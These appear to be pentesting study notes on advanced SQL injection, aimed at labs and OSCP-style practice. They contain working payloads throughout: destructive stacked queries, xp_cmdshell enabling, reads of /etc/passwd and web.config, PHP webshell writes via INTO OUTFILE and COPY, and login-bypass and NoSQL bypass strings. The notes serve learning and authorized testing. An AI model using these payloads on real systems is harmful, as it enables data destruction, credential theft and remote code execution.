# Advanced & Often-Missed SQLi Topics

> These are the pieces that get skipped in most "all SQLi types" note sets but show up
> constantly in real engagements and in the harder PortSwigger labs / OSCP-style boxes.
> Treat this as required reading, not optional extra credit.

---

## 1. Stacked Queries

### 1.1 Concept
Some DB drivers allow **multiple statements separated by `;` in a single request**. If
supported, this means you're not limited to `SELECT`-based tricks — you can run
`INSERT`, `UPDATE`, `DROP`, or even stored procedures in the same injection.

```sql
'; DROP TABLE users--
'; INSERT INTO users (username,password) VALUES ('hacker','pass')--
'; exec master..xp_cmdshell 'whoami'--      -- MSSQL, if xp_cmdshell is enabled
```

### 1.2 Support by Engine
| Engine | Stacked queries supported? |
|---|---|
| MySQL | Depends on driver/API (PHP `mysqli` with multi-query enabled: yes; most default PDO/mysqli single-query calls: no) |
| MSSQL | Yes, by default |
| PostgreSQL | Yes, by default |
| Oracle | No — Oracle does not allow multiple statements in one query string |

### 1.3 Real-World Notes
- Stacked queries are how a "just a SELECT injection" becomes **data destruction risk**
  on a live engagement — always get explicit written authorization before testing
  `DROP`/`UPDATE`/`DELETE` payloads on anything resembling production data, and prefer
  testing in a way that's reversible (e.g. insert-then-delete-your-own-test-row) when
  scope allows it at all.
- This is also the primary path to `xp_cmdshell`-based RCE on MSSQL (see section 3).

### 1.4 PortSwigger Note
PortSwigger's free labs mostly avoid destructive stacked-query exploitation by design,
but the **SQL injection with filter bypass via XML encoding** lab and several "Examining
the database" labs touch on stacked-query-adjacent syntax. Real practice for destructive
stacked queries usually comes from dedicated VMs (HackTheBox, TryHackMe, your own local
DVWA/bWAPP setup) rather than the academy's live-but-shared labs.

---

## 2. File System Access via SQLi

### 2.1 MySQL — `LOAD_FILE()` / `INTO OUTFILE`
```sql
-- Read a file (needs FILE privilege + secure_file_priv not restricting the path)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Write a file (classic path to a webshell)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```
Requirements: DB user has `FILE` privilege, `secure_file_priv` isn't blocking the target
directory, and you know (or can guess/brute-force) the actual web root path.

### 2.2 MSSQL — `xp_cmdshell` + file ops
```sql
-- Enable xp_cmdshell if disabled and you have sysadmin rights
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
```sql
-- Reading files via OPENROWSET (alternative to xp_cmdshell)
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS contents
```

### 2.3 PostgreSQL — `COPY` for file read/write
```sql
-- Read
CREATE TABLE temp_table(t text);
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;

-- Write (requires superuser, rarer in practice)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### 2.4 Real-World Notes
- File write → webshell is the cleanest SQLi-to-RCE chain and the one you should be able
  to explain end-to-end without sqlmap, since it directly demonstrates business impact in
  a report ("SQL injection led to remote code execution") far more convincingly than a
  data dump alone.
- Always confirm the actual web root path before attempting file write — guessing wrong
  wastes attempts and can leave orphaned files in unexpected directories on the target
  filesystem, which is messy from a cleanup/reporting standpoint.

---

## 3. SQLi → RCE Summary Chains

| Engine | Primary RCE Path |
|---|---|
| MySQL | `INTO OUTFILE` webshell drop (if FILE privilege + web-writable path) |
| MSSQL | `xp_cmdshell` (if enabled or enablable with sysadmin rights) |
| PostgreSQL | `COPY ... TO PROGRAM` (Postgres 9.3+, if superuser) or UDF-based exploitation |
| Oracle | Java stored procedures / `DBMS_SCHEDULER` job abuse (advanced, less common in basic pentests) |

---

## 4. Authentication Bypass — Quick Cheatsheet

These are the classic login-bypass strings, useful both as confirmation payloads and as
real bypass attempts on poorly-built auth:

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 'a'='a
') OR ('1'='1
admin' OR '1'='1'--
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'--   (if you know the password hash format)
```

### Real-World Note
Modern apps using parameterized queries/ORMs are immune to these — but you'll still see
them work surprisingly often on **legacy internal tools, admin panels bolted on later,
and vendor software** that wasn't built with the same security rigor as the main
customer-facing app. Always test login forms with these even when the main app feels
solid — internal/secondary panels are frequently the weak link.

---

## 5. Injection Context Variations Worth Knowing

### 5.1 `ORDER BY` Clause Injection
You can't use UNION the same way here — instead use conditional logic inside the ORDER
BY itself:
```sql
ORDER BY (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
ORDER BY IF(1=1,1,(SELECT 1 UNION SELECT 2))   -- forces an error on false, MySQL
```
This is a boolean-blind-style technique adapted to a context where UNION literally can't
be appended.

### 5.2 `INSERT`/`UPDATE` Statement Injection
Usually only blind techniques apply here since there's no result set to UNION against
directly — confirm with boolean or time-based payloads inside the value being inserted.

### 5.3 HTTP Header-Based Injection
```
User-Agent: ' OR SLEEP(5)--
X-Forwarded-For: 1' AND '1'='1
Cookie: trackingId=abc' AND '1'='1
```
Headers are processed by application logic just like form fields in many apps (e.g. for
logging, analytics, geo-IP lookups) — these are commonly missed in basic testing but
are standard in real engagements precisely because automated scanners often skip
non-standard parameter locations.

---

## 6. NoSQL Injection (Different Class, Worth Knowing Exists)

Not the same vulnerability class as SQLi (no SQL involved at all), but conceptually
related and worth a one-paragraph mental note: NoSQL databases (MongoDB, etc.) can be
injected via operator manipulation in JSON-based queries, e.g.:
```json
{"username": "admin", "password": {"$ne": ""}}
```
This bypasses authentication by exploiting MongoDB's `$ne` (not equal) operator instead
of SQL syntax. If you encounter a MongoDB-backed app on an engagement, this is a
**separate note set to build later** — don't conflate it with SQLi technique selection,
since the detection and payload syntax are completely different.

---

## 7. Final "Is Anything Else Missing?" Checklist

At this point the full SQLi note series covers:

- [x] In-band (UNION, Error-based)
- [x] Blind (Boolean, Time-based)
- [x] Out-of-band
- [x] Second-order/stored
- [x] WAF/filter bypass (manual + sqlmap tamper scripts)
- [x] Stacked queries
- [x] File read/write
- [x] SQLi → RCE chains
- [x] Auth bypass cheatsheet
- [x] Context variations (ORDER BY, INSERT/UPDATE, HTTP headers)
- [x] sqlmap full usage
- [ ] NoSQL injection — intentionally **not** covered in depth here (different vuln
  class); build as its own note set later if/when you take on MongoDB-backed targets.

This is now a complete, real-world-aligned SQLi reference. Nothing major is left out for
classic relational-database SQL injection.
